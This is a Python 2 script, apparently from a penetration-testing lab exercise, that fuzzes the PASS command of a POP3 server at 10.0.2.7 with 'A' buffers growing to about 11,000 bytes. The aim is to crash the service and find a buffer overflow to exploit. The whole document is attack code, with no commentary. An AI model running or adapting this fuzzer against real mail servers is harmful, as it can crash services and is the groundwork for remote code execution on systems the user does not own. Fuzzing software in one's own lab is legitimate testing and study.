#!/usr/bin/python

import socket
import os
import sys
import time

host="10.0.2.7"
port=110

buffer=["A"]
counter=350
while len(buffer) <= 32:
		buffer.append("A"*counter)
		counter=counter+350

for string in buffer:
	print "fuzzing PASS with %s bytes" % len(string)
	expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	expl.connect((host, port))
	expl.send("USER PuffGT\r\n" )
	expl.send("PASS" + string+ '\r\n')
	expl.close()
	time.sleep(1)
